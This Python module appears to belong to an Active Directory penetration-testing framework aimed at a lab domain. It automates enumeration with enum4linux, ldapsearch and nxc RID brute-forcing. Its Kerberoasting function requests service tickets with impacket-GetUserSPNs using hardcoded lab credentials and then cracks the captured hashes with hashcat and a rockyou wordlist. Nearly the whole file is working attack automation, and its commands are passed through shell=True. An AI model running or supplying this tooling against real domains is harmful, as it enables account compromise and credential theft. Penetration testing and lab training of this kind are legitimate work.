#automation part as discussed 

import subprocess
import sys
import os
from utils.nmap import *
from utils.dc_enumeration import *
from colorama import Fore, Style, init
from core.module_base import ModuleBase
from modules.no_cred import no_cred
from core.context import Context
from utils.input_or_file import get_input_or_file
from utils.run_command import run_command


init()

class engine(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "AUTOMATION"
        self.options = {
            "ip": None,
            "domain": None
        }
        self.actions = {
            "noCredentials": self.initial_enemurations,
            # "kerboroasting": self.kerboroasting_attack
        }
        #self.found_users = []
        #self.context = Context()
        self.color = Fore.GREEN

    def prepare(self):
        ip = self.options["ip"]
        if not ip:
            print("[-] Need IP")
            return None
        ip_list = get_input_or_file(ip)
        return ip_list

    def banner(self):
        print(Fore.MAGENTA + f"\n🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'\n")


    def enum4linux(self):
        ip_list = self.prepare()
        if not ip_list:
            return
        for ip in ip_list:
            command = ["enum4linux", ip]
            print(f"Running: {' '.join(command)}")
            try:
                result = subprocess.run(command, shell=False, text=True)
            except Exception as e:
                print(f"[-] error while running enum4linux: {e}")


    def ldapsearch(self):
        ip_list = self.prepare()
        if not ip_list:
            return
        for ip in ip_list:
            uri = f"ldap://{ip}"
            command = ["ldapsearch", "-x", "-H", uri, "-s", "base"]
            print("Running ldapsearch...")
            try:
                result = subprocess.run(command, shell=False, text=True)
            except Exception as e:
                print(f"Exception : {e}")


    def rid_brute(self):
        dc_ip = self.get_param("ip", required=True)
        if not dc_ip:
            return

        cmd = ["nxc", "smb", dc_ip, "--rid-brute", "10000"]
        self.run_tool(cmd, key="users", source="rid_brute")


            
    ###
    def initial_enemurations(self):
        print("running ldapsearch")
        self.ldapsearch()
        print("---"*50)
        print("Running enum4linux: ")
        self.enum4linux()
        print("-----------------\nrunning rid bruteforcing")
        self.rid_brute()
        if self.context:
            self.context.commit_pending()







##############
    def kerboroasting_attack(self):

        ## not use for real case
        username = 'samwell.tarly'
        password = 'Haertsbane'
        command = f'impacket-GetUserSPNs -request -dc-ip {self.options["ip"]} north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.txt'

        try:
            result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            
            if result.returncode == 0:
                print("\n[+] Kerberoasting attack completed. Output saved to 'kerberoasting.txt'.")
                print(result.stdout)

                if input("Would you like to read the output from 'kerberoasting.txt'? (Y/n): ").strip().lower() in ['y', '']:
                    if os.path.exists("kerberoasting.txt"):
                        with open("kerberoasting.txt", "r") as f:
                            content = f.read()
                            print("\n📄 --- File Content Start ---\n")
                            print(content)
                            print("\n📄 --- File Content End ---\n")

                            # Check if hash is present and ask to crack
                            if "$krb5tgs$" in content:
                                if input("Hash detected. Do you want to try cracking it with Hashcat? (Y/n): ").strip().lower() in ['y', '']:
                                    crack_command = "hashcat -m 13100 kerberoasting.txt resources/rockyou.txt --force"
                                    
                                    print(f"\n[+] Starting Hashcat: {crack_command}")
                                    try:
                                        subprocess.run(crack_command, shell=True)
                                        show_cracked = subprocess.run("hashcat -m 13100 kerberoasting.txt --show", 
                                                                    shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                                        if show_cracked.returncode == 0 and show_cracked.stdout.strip():
                                            for line in show_cracked.stdout.strip().splitlines():
                                                if ':' not in line:
                                                    continue
                                                hash_part, password = line.strip().split(":", 1)
                                                if "$krb5tgs$" in hash_part:
                                                    self.handle_cracked_hash(hash_part, password)
                                        else:
                                            print("[-] No hashes were cracked or an error occurred during --show.")

                                    except Exception as e:
                                        print(f"[-] Error while running Hashcat: {e}")
                            else:
                                print("[-] No Kerberos hashes found in the output.")
                    else:
                        print("[-] File 'kerberoasting.txt' does not exist!")
            else:
                print(f"[-] Error:\n{result.stderr}")
        except Exception as e:
            print(f"\n[-] Exception: {e}")
